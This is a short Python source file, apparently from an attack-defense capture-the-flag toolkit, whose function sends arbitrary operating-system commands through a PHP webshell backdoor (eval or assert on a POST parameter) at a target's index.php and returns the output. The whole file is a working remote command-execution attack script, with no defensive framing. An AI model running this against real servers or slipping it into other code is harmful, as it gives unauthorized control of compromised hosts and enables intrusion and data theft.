
# coding:utf-8
from urllib.request import quote
from utils.logger import logger
import traceback
import requests

proxies = {
    #"http": "http://192.168.144.137:8080"
}


def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[1]);
    assert($_POST[1]);
    """
    try:

        session = requests.Session()
        paramsPOST = {"moxiaoxi": "system('{cmd}');".format(cmd=cmd)}
        response = session.post("http://{}:{}/index.php".format(target, target_port), data=paramsPOST,
                                proxies=proxies)
        res = response.content.decode()
        res = res.strip()
    except Exception as e:
        logger.debug(traceback.format_exc())
        logger.warning("attack failed" + target + "vulnerable attack")
        # print(e)
        res = "error"
    return res
